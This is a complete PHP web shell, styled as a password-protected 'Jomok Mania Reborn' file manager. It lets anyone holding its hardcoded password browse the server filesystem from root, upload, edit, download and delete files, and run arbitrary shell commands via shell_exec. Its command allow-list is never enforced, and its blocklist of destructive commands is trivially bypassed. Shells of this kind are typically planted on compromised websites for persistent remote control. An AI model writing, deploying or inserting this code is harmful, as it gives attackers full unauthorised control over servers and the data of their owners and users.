<?php
// Jomok Mania Reborn - File Manager
// Internal Research Use Only

// ===== PASSWORD PROTECTION =====
$correct_password = 'sukacoli'; // Ganti dengan password yang diinginkan
$session_name = 'jomok_auth';

// Start session if not already started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Check if user is authenticated
function is_authenticated() {
    global $session_name;
    return isset($_SESSION[$session_name]) && $_SESSION[$session_name] === true;
}

// Handle login
if (isset($_POST['login_password'])) {
    $input_password = $_POST['login_password'];
    global $correct_password;
    if ($input_password === $correct_password) {
        $_SESSION[$session_name] = true;
        // Redirect to remove POST data
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Password salah!';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION[$session_name]);
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// If not authenticated, show login page
if (!is_authenticated()) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Jomok Mania Reborn - Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0e0a;
                color: #00cc44;
                font-family: 'Courier New', 'Consolas', monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-box {
                border: 2px solid #00cc44;
                padding: 40px 50px;
                background: #0f140f;
                max-width: 400px;
                width: 90%;
                text-align: center;
            }
            .login-box h1 {
                font-weight: normal;
                font-size: 22px;
                letter-spacing: 2px;
                margin-bottom: 8px;
            }
            .login-box .sub {
                opacity: 0.5;
                font-size: 12px;
                margin-bottom: 25px;
                letter-spacing: 4px;
            }
            .login-box input[type="password"] {
                background: #0a0e0a;
                border: 1px solid #00cc44;
                color: #00cc44;
                padding: 10px 14px;
                font-family: inherit;
                font-size: 16px;
                width: 100%;
                margin-bottom: 15px;
                text-align: center;
                letter-spacing: 4px;
            }
            .login-box input[type="password"]:focus {
                outline: none;
                box-shadow: 0 0 20px rgba(0, 204, 68, 0.15);
            }
            .login-box button {
                background: #0a0e0a;
                border: 1px solid #00cc44;
                color: #00cc44;
                padding: 10px 40px;
                font-family: inherit;
                font-size: 15px;
                cursor: pointer;
                transition: all 0.2s;
                letter-spacing: 3px;
                width: 100%;
            }
            .login-box button:hover {
                background: #00cc44;
                color: #0a0e0a;
            }
            .login-box .error {
                color: #cc4444;
                margin-bottom: 15px;
                font-size: 13px;
            }
            .login-box .hint {
                opacity: 0.3;
                font-size: 11px;
                margin-top: 15px;
            }
            .marquee-login {
                background: #0f140f;
                padding: 6px 0;
                border: 1px solid #00cc44;
                margin-bottom: 20px;
                overflow: hidden;
                white-space: nowrap;
                position: relative;
            }
            .marquee-login .marquee-text {
                display: inline-block;
                padding-left: 100%;
                animation: marqueeScroll 12s linear infinite;
                font-size: 12px;
                letter-spacing: 3px;
                font-weight: bold;
                background: linear-gradient(90deg, #ff2200, #ff6600, #ff2200, #ff6600, #ff2200);
                background-size: 300% 100%;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                filter: drop-shadow(0 0 8px rgba(255, 68, 0, 0.3));
            }
            @keyframes marqueeScroll {
                0% { transform: translateX(0); }
                100% { transform: translateX(-100%); }
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="marquee-login">
                <span class="marquee-text">ACCESS RESTRICTED &gt; AUTHORIZATION REQUIRED &gt; </span>
            </div>
            <h1>JOMOK MANIA</h1>
            <div class="sub">FILE MANAGER</div>
            
            <?php if (isset($login_error)): ?>
            <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            
            <form method="post">
                <input type="password" name="login_password" placeholder="Enter Password" autofocus>
                <button type="submit">ACCESS</button>
            </form>
            <div class="hint">[ masukkan password ]</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}
// ===== END PASSWORD PROTECTION =====

$base_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$base_dir = realpath($base_dir) ?: getcwd();

function sanitize_path($path) {
    $path = str_replace('..', '', $path);
    $path = str_replace('./', '', $path);
    $path = ltrim($path, '/');
    return $path;
}

function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function is_editable($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $editable = array('txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'yml', 'yaml', 'conf', 'ini', 'cfg', 'log', 'sh', 'bash', 'py', 'pl', 'rb', 'c', 'cpp', 'h', 'hpp', 'java', 'go', 'rs', 'sql', 'md', 'csv');
    return in_array($ext, $editable);
}

// Function to execute commands safely
function execute_command($cmd, $current_dir) {
    $cmd = trim($cmd);
    
    $allowed_commands = array(
        'ls', 'dir', 'pwd', 'whoami', 'date', 'uptime', 'uname', 
        'echo', 'cat', 'head', 'tail', 'grep', 'find', 'wc', 
        'mkdir', 'rmdir', 'touch', 'cp', 'mv', 'rm', 'chmod', 
        'chown', 'du', 'df', 'free', 'ps', 'top', 'netstat',
        'ping', 'nslookup', 'dig', 'curl', 'wget'
    );
    
    $cmd_parts = explode(' ', $cmd);
    $base_cmd = strtolower($cmd_parts[0]);
    
    $cmd = escapeshellcmd($cmd);
    
    $dangerous = array('rm -rf', 'dd', 'mkfs', 'format', 'shutdown', 'reboot', 'halt', 'poweroff');
    foreach ($dangerous as $bad) {
        if (stripos($cmd, $bad) !== false) {
            return "ERROR: Command not allowed for security reasons.";
        }
    }
    
    $full_cmd = "cd " . escapeshellarg($current_dir) . " && " . $cmd . " 2>&1";
    $output = shell_exec($full_cmd);
    
    if ($output === null) {
        return "Command executed (no output)";
    }
    
    if (strlen($output) > 50000) {
        $output = substr($output, 0, 50000) . "\n... (output truncated)";
    }
    
    return $output;
}

$message = '';
$message_type = '';
$terminal_output = '';
$terminal_command = '';

if (isset($_POST['upload'])) {
    $target_dir = $base_dir . '/';
    $target_file = $target_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $message = 'Upload successful';
        $message_type = 'success';
    } else {
        $message = 'Upload failed';
        $message_type = 'error';
    }
}

if (isset($_POST['create_folder'])) {
    $folder_name = sanitize_path($_POST['folder_name']);
    $folder_path = $base_dir . '/' . $folder_name;
    if (!empty($folder_name) && !file_exists($folder_path)) {
        if (mkdir($folder_path, 0777, true)) {
            $message = 'Folder created: ' . htmlspecialchars($folder_name);
            $message_type = 'success';
        } else {
            $message = 'Failed to create folder';
            $message_type = 'error';
        }
    } else {
        $message = 'Folder name invalid or already exists';
        $message_type = 'error';
    }
}

if (isset($_POST['create_file'])) {
    $file_name = sanitize_path($_POST['file_name']);
    $file_path = $base_dir . '/' . $file_name;
    if (!empty($file_name) && !file_exists($file_path)) {
        if (file_put_contents($file_path, '') !== false) {
            $message = 'File created: ' . htmlspecialchars($file_name);
            $message_type = 'success';
        } else {
            $message = 'Failed to create file';
            $message_type = 'error';
        }
    } else {
        $message = 'File name invalid or already exists';
        $message_type = 'error';
    }
}

if (isset($_POST['save_file'])) {
    $edit_file = sanitize_path($_POST['edit_file']);
    $file_path = $base_dir . '/' . $edit_file;
    if (file_exists($file_path) && is_writable($file_path)) {
        if (file_put_contents($file_path, $_POST['file_content']) !== false) {
            $message = 'File saved: ' . htmlspecialchars($edit_file);
            $message_type = 'success';
        } else {
            $message = 'Failed to save file';
            $message_type = 'error';
        }
    } else {
        $message = 'File not found or not writable';
        $message_type = 'error';
    }
}

if (isset($_GET['delete'])) {
    $delete_path = $base_dir . '/' . sanitize_path($_GET['delete']);
    if (file_exists($delete_path)) {
        if (is_dir($delete_path)) {
            if (rmdir($delete_path)) {
                $message = 'Folder deleted: ' . htmlspecialchars($_GET['delete']);
                $message_type = 'success';
            } else {
                $message = 'Failed to delete folder (must be empty)';
                $message_type = 'error';
            }
        } else {
            if (unlink($delete_path)) {
                $message = 'File deleted: ' . htmlspecialchars($_GET['delete']);
                $message_type = 'success';
            } else {
                $message = 'Failed to delete file';
                $message_type = 'error';
            }
        }
    } else {
        $message = 'File/folder not found';
        $message_type = 'error';
    }
}

if (isset($_POST['rename'])) {
    $old_name = sanitize_path($_POST['old_name']);
    $new_name = sanitize_path($_POST['new_name']);
    $old_path = $base_dir . '/' . $old_name;
    $new_path = $base_dir . '/' . $new_name;
    if (file_exists($old_path) && !empty($new_name) && !file_exists($new_path)) {
        if (rename($old_path, $new_path)) {
            $message = 'Renamed: ' . htmlspecialchars($old_name) . ' -> ' . htmlspecialchars($new_name);
            $message_type = 'success';
        } else {
            $message = 'Rename failed';
            $message_type = 'error';
        }
    } else {
        $message = 'Invalid name or already exists';
        $message_type = 'error';
    }
}

if (isset($_GET['download'])) {
    $file_path = $base_dir . '/' . sanitize_path($_GET['download']);
    if (file_exists($file_path) && !is_dir($file_path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

// Terminal command execution
if (isset($_POST['terminal_cmd'])) {
    $terminal_command = $_POST['terminal_cmd'];
    if (!empty($terminal_command)) {
        $terminal_output = execute_command($terminal_command, $base_dir);
    }
}

$items = array_diff(scandir($base_dir), array('.', '..'));
$directories = array();
$files = array();

foreach ($items as $item) {
    $path = $base_dir . '/' . $item;
    if (is_dir($path)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}
sort($directories);
sort($files);
$all_items = array_merge($directories, $files);

// Breadcrumb
function build_breadcrumb($path) {
    $parts = explode('/', $path);
    $breadcrumb = array();
    $current = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current .= '/' . $part;
        $breadcrumb[] = array('name' => $part, 'path' => $current);
    }
    return $breadcrumb;
}
$breadcrumb = build_breadcrumb($base_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jomok Mania Reborn</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e0a;
            color: #00cc44;
            font-family: 'Courier New', 'Consolas', monospace;
            font-size: 14px;
            padding: 20px;
            min-height: 100vh;
        }
        a { color: #00cc44; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1200px; margin: 0 auto; }
        
        .header {
            border-bottom: 1px solid #00cc44;
            padding-bottom: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        .header h1 {
            font-weight: normal;
            font-size: 20px;
            letter-spacing: 2px;
        }
        .header .logout-link {
            font-size: 12px;
            opacity: 0.5;
            border: 1px solid #2a4a2a;
            padding: 4px 12px;
            transition: all 0.2s;
        }
        .header .logout-link:hover {
            opacity: 1;
            border-color: #cc4444;
            color: #cc4444;
            text-decoration: none;
        }
        
        .marquee-header {
            background: #0f140f;
            padding: 8px 0;
            border: 1px solid #00cc44;
            margin-bottom: 20px;
            overflow: hidden;
            white-space: nowrap;
            position: relative;
        }
        .marquee-header .marquee-text {
            display: inline-block;
            padding-left: 100%;
            animation: marqueeScroll 18s linear infinite;
            font-size: 14px;
            letter-spacing: 3px;
            font-weight: bold;
            background: linear-gradient(90deg, #ff2200, #ff6600, #ff2200, #ff6600, #ff2200);
            background-size: 300% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: none;
            filter: drop-shadow(0 0 8px rgba(255, 68, 0, 0.3));
        }
        @keyframes marqueeScroll {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
        }
        
        .path {
            background: #0f140f;
            padding: 8px 12px;
            border: 1px solid #00cc44;
            font-size: 13px;
            word-break: break-all;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        .path .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            align-items: center;
        }
        .path .breadcrumb a {
            padding: 2px 8px;
            border: 1px solid transparent;
            transition: all 0.2s;
            font-size: 13px;
        }
        .path .breadcrumb a:hover {
            border-color: #00cc44;
            background: #0a0e0a;
            text-decoration: none;
        }
        .path .breadcrumb .sep {
            opacity: 0.4;
            padding: 0 2px;
        }
        .path .breadcrumb .current {
            padding: 2px 8px;
            opacity: 0.7;
        }
        .path .path-links a {
            padding: 4px 12px;
            border: 1px solid #00cc44;
            background: #0a0e0a;
            font-size: 12px;
            transition: all 0.2s;
            text-decoration: none;
        }
        .path .path-links a:hover {
            background: #00cc44;
            color: #0a0e0a;
            text-decoration: none;
        }
        
        .message {
            padding: 8px 12px;
            margin-bottom: 15px;
            border: 1px solid #00cc44;
            background: #0f140f;
        }
        .message.success { border-color: #00cc44; color: #00cc44; }
        .message.error { border-color: #cc4444; color: #cc4444; }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
        
        .panel {
            border: 1px solid #00cc44;
            padding: 15px;
            background: #0f140f;
        }
        .panel h3 {
            font-weight: normal;
            font-size: 14px;
            letter-spacing: 1px;
            margin-bottom: 12px;
            border-bottom: 1px solid #00cc44;
            padding-bottom: 6px;
        }
        
        input[type="text"], input[type="file"] {
            background: #0a0e0a;
            border: 1px solid #00cc44;
            color: #00cc44;
            padding: 6px 10px;
            font-family: inherit;
            font-size: 13px;
            width: 100%;
            margin-bottom: 8px;
        }
        input[type="file"] { padding: 4px; }
        input[type="text"]:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 204, 68, 0.2);
        }
        button, .btn {
            background: #0a0e0a;
            border: 1px solid #00cc44;
            color: #00cc44;
            padding: 6px 16px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        button:hover, .btn:hover {
            background: #00cc44;
            color: #0a0e0a;
        }
        .btn-small {
            padding: 3px 10px;
            font-size: 12px;
            display: inline-block;
        }
        
        .file-list {
            margin-top: 10px;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 5px 0;
            border-bottom: 1px solid #1a2a1a;
            flex-wrap: wrap;
            gap: 5px;
        }
        .file-item:hover { background: #141f14; }
        .file-name {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .file-name .icon {
            display: inline-block;
            width: 18px;
            text-align: center;
            opacity: 0.7;
        }
        .file-name .dir-icon { color: #33dd88; }
        .file-name .file-icon { color: #66dd99; }
        .file-size {
            font-size: 12px;
            opacity: 0.6;
            margin-left: 8px;
        }
        .file-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .file-actions a, .file-actions button {
            font-size: 12px;
            padding: 2px 8px;
            border: 1px solid #2a4a2a;
            background: transparent;
            color: #55dd88;
            cursor: pointer;
            font-family: inherit;
        }
        .file-actions a:hover, .file-actions button:hover {
            background: #00cc44;
            color: #0a0e0a;
            border-color: #00cc44;
        }
        .file-actions .delete { color: #cc5555; border-color: #4a2a2a; }
        .file-actions .delete:hover { background: #cc4444; color: #0a0e0a; border-color: #cc4444; }
        
        .edit-area {
            margin-top: 15px;
        }
        .edit-area textarea {
            width: 100%;
            min-height: 250px;
            max-height: 500px;
            background: #0a0e0a;
            border: 1px solid #00cc44;
            color: #00cc44;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 10px;
            resize: vertical;
        }
        .edit-area textarea:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 204, 68, 0.15);
        }
        
        .terminal {
            border: 1px solid #00cc44;
            background: #0a0e0a;
            padding: 10px;
            margin-top: 10px;
            font-family: 'Courier New', monospace;
        }
        .terminal-output {
            max-height: 300px;
            overflow-y: auto;
            background: #050805;
            padding: 8px;
            margin-bottom: 8px;
            border: 1px solid #1a2a1a;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 13px;
            color: #00dd55;
            min-height: 50px;
        }
        .terminal-output .prompt {
            color: #33dd88;
        }
        .terminal-output .error {
            color: #ff5555;
        }
        .terminal-form {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .terminal-form .prompt-label {
            color: #00cc44;
            font-weight: bold;
            min-width: 20px;
        }
        .terminal-form input[type="text"] {
            flex: 1;
            min-width: 150px;
            background: #050805;
            border: 1px solid #00cc44;
            color: #00cc44;
            padding: 5px 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin-bottom: 0;
        }
        .terminal-form button {
            padding: 5px 15px;
            font-size: 13px;
            border: 1px solid #00cc44;
            background: #0a0e0a;
            color: #00cc44;
            cursor: pointer;
            transition: all 0.2s;
        }
        .terminal-form button:hover {
            background: #00cc44;
            color: #0a0e0a;
        }
        .terminal-help {
            font-size: 11px;
            opacity: 0.5;
            margin-top: 5px;
        }
        
        .flex-row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
        .flex-row input[type="text"] { flex: 1; min-width: 120px; margin-bottom: 0; }
        .mt-10 { margin-top: 10px; }
        .mt-15 { margin-top: 15px; }
        
        ::-webkit-scrollbar {
            width: 6px;
            background: #0a0e0a;
        }
        ::-webkit-scrollbar-thumb {
            background: #00cc44;
            border-radius: 0;
        }
    </style>
</head>
<body>
<div class="container">

<div class="marquee-header">
    <span class="marquee-text">JOMOK MANIA REBORN &gt; FILE MANAGER &gt; ACCESS GRANTED &gt; ALL SYSTEMS OPERATIONAL &gt; </span>
</div>

<div class="header">
    <h1>JOMOK MANIA REBORN</h1>
    <div style="display:flex; gap:10px; align-items:center;">
        <span style="opacity:0.5; font-size:12px;">FILE MANAGER</span>
        <a href="?logout=1" class="logout-link">[LOGOUT]</a>
    </div>
</div>

<div class="path">
    <span class="breadcrumb">
        <a href="?dir=/">/</a>
        <?php 
        $count = count($breadcrumb);
        $i = 0;
        foreach ($breadcrumb as $item):
            $i++;
            if ($i == $count):
        ?>
            <span class="sep">/</span>
            <span class="current"><?php echo htmlspecialchars($item['name']); ?></span>
        <?php else: ?>
            <span class="sep">/</span>
            <a href="?dir=<?php echo urlencode($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
        <?php endif; endforeach; ?>
    </span>
    <span class="path-links">
        <a href="?dir=<?php echo urlencode(dirname($base_dir)); ?>">[UP]</a>
    </span>
</div>

<?php if ($message): ?>
<div class="message <?php echo $message_type; ?>">
    <?php echo htmlspecialchars($message); ?>
</div>
<?php endif; ?>

<div class="grid">
    <div class="panel">
        <h3>UPLOAD FILE</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" name="upload">Upload</button>
        </form>
    </div>
    
    <div class="panel">
        <h3>CREATE</h3>
        <div style="margin-bottom:8px;">
            <form method="post" style="display:flex; gap:8px; flex-wrap:wrap;">
                <input type="text" name="folder_name" placeholder="Folder name" style="flex:1; min-width:100px;">
                <button type="submit" name="create_folder">Folder</button>
            </form>
        </div>
        <form method="post" style="display:flex; gap:8px; flex-wrap:wrap;">
            <input type="text" name="file_name" placeholder="File name" style="flex:1; min-width:100px;">
            <button type="submit" name="create_file">File</button>
        </form>
    </div>
</div>

<!-- Terminal Panel -->
<div class="panel" style="margin-bottom:20px;">
    <h3>TERMINAL</h3>
    <div class="terminal">
        <div class="terminal-output" id="terminalOutput">
            <?php if (!empty($terminal_output)): ?>
                <span class="prompt">$ <?php echo htmlspecialchars($terminal_command); ?></span>
                <span style="color:#00dd55;">
                    <?php echo htmlspecialchars($terminal_output); ?>
                </span>
            <?php else: ?>
                <span style="opacity:0.5;">Type a command and press Enter or click Execute</span>
            <?php endif; ?>
        </div>
        <form method="post" class="terminal-form">
            <span class="prompt-label">$</span>
            <input type="text" name="terminal_cmd" id="terminalCmd" 
                   placeholder="Enter command..." 
                   value="<?php echo htmlspecialchars($terminal_command); ?>"
                   autofocus>
            <button type="submit">Execute</button>
            <button type="button" onclick="document.getElementById('terminalCmd').value='';" style="border-color:#4a4a4a; color:#666;">Clear</button>
        </form>
        <div class="terminal-help">
            Available commands: ls, pwd, cat, echo, mkdir, rm, cp, mv, chmod, grep, find, du, df, ps, ping, curl, wget, and more
        </div>
    </div>
</div>

<div class="panel" style="margin-bottom:20px;">
    <h3>DIRECTORY LISTING</h3>
    <div class="file-list">
        <?php if (empty($all_items)): ?>
        <div style="opacity:0.5; padding:10px 0;">Empty directory</div>
        <?php else: ?>
        <?php foreach ($all_items as $item):
            $path = $base_dir . '/' . $item;
            $is_dir = is_dir($path);
            $size = $is_dir ? '' : format_size(filesize($path));
            $icon = $is_dir ? '[D]' : '[F]';
            $icon_class = $is_dir ? 'dir-icon' : 'file-icon';
        ?>
        <div class="file-item">
            <span class="file-name">
                <span class="icon <?php echo $icon_class; ?>"><?php echo $icon; ?></span>
                <?php if ($is_dir): ?>
                <a href="?dir=<?php echo urlencode($path); ?>"><strong><?php echo htmlspecialchars($item); ?></strong></a>
                <?php else: ?>
                <span><?php echo htmlspecialchars($item); ?></span>
                <?php endif; ?>
                <?php if ($size): ?><span class="file-size"><?php echo $size; ?></span><?php endif; ?>
            </span>
            <span class="file-actions">
                <?php if (!$is_dir): ?>
                <a href="?download=<?php echo urlencode($item); ?>">[DL]</a>
                <?php if (is_editable($item)): ?>
                <a href="?dir=<?php echo urlencode($base_dir); ?>&edit=<?php echo urlencode($item); ?>">[EDIT]</a>
                <?php endif; ?>
                <?php endif; ?>
                <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($item); ?>?');">
                    <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item); ?>">
                    <input type="text" name="new_name" placeholder="rename" style="width:90px; display:inline; padding:2px 4px; font-size:11px; margin:0 2px;">
                    <button type="submit" name="rename" style="font-size:11px; padding:2px 6px;">[R]</button>
                </form>
                <a href="?dir=<?php echo urlencode($base_dir); ?>&delete=<?php echo urlencode($item); ?>" class="delete" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?');">[X]</a>
            </span>
        </div>
        <?php endforeach; ?>
        <?php endif; ?>
    </div>
</div>

<?php if (isset($_GET['edit'])):
    $edit_file = sanitize_path($_GET['edit']);
    $edit_path = $base_dir . '/' . $edit_file;
    if (file_exists($edit_path) && !is_dir($edit_path) && is_readable($edit_path)):
        $content = file_get_contents($edit_path);
        $is_writable = is_writable($edit_path);
?>
<div class="panel edit-area">
    <h3>EDIT: <?php echo htmlspecialchars($edit_file); ?></h3>
    <form method="post">
        <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($edit_file); ?>">
        <textarea name="file_content" <?php echo $is_writable ? '' : 'readonly'; ?>><?php echo htmlspecialchars($content); ?></textarea>
        <div class="mt-10">
            <?php if ($is_writable): ?>
            <button type="submit" name="save_file">Save</button>
            <?php else: ?>
            <span style="opacity:0.5;">(read-only)</span>
            <?php endif; ?>
            <a href="?dir=<?php echo urlencode($base_dir); ?>" style="margin-left:12px;">[Back]</a>
        </div>
    </form>
</div>
<?php endif; endif; ?>

<div style="margin-top:20px; border-top:1px solid #1a2a1a; padding-top:10px; font-size:11px; opacity:0.4; text-align:center;">
    Jomok Mania Reborn | File Manager
</div>

</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const terminalInput = document.getElementById('terminalCmd');
    if (terminalInput) {
        terminalInput.focus();
        
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                this.form.submit();
            }
        });
    }
    
    const output = document.getElementById('terminalOutput');
    if (output) {
        output.scrollTop = output.scrollHeight;
    }
});
</script>

</body>
</html>
